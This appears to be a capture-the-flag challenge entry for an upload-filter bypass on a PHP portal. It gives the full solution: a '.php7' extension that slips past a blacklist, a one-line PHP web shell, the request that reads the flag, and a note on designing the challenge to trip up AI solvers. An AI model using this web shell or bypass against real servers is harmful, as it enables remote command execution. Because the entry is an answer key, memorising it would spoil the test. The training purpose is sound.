# Challenge 11

## Title
Stark Upload

## Difficulty
Medium

## Points
200

## Description
Stark Industries just launched their employee self-service portal. Employees can upload a profile photo — simple enough. But Tony always built things fast, not perfect. Their file filter feels... incomplete. Get a shell on the server and read the flag at `/flag.txt`.

## Service
Live web challenge — provided URL on competition day.

## Hint
*"I am Iron Man."* — And I cut corners on the upload filter. What PHP extensions does the Apache server actually execute beyond the obvious ones?

## Solution
The upload form blacklists: `.php`, `.php3`, `.php4`, `.php5`, `.phtml`

But the Apache config registers `.php7` as a PHP handler — and `.php7` is NOT in the blacklist.

**AI trap:** AI suggests `.phtml` first (classic bypass) → blocked. Tries `.php5` → blocked. Never reaches `.php7` because it's a less-documented extension.

Steps:
1. Create a file named `shell.php7` containing `<?php system($_GET['cmd']); ?>`
2. Upload via the portal
3. Visit `/uploads/shell.php7?cmd=cat+/flag.txt`

## Flag
`cyn0x{ph3_upl04d_f1lt3r_3vas10n}`
